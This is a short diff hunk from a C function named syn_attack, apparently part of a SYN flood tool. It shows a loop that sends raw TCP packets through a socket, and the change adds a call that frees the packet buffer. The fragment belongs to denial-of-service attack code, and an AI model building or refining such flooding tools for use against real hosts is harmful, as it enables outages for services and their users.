@@ -79,8 +79,9 @@ void* syn_attack(void* arg) {
         tcph->check = tcp_udp_checksum(tcph, sizeof(struct tcphdr), iph->saddr, iph->daddr, IPPROTO_TCP);
         ssize_t sent = sendto(syn_sock, packet, packet_size, 0, (struct sockaddr*)&dest, sizeof(dest));
         if (sent < 0) break;
-    }
-
+    }   
+    //free packet
+    free(packet);
     close(syn_sock);
     return NULL;
 }
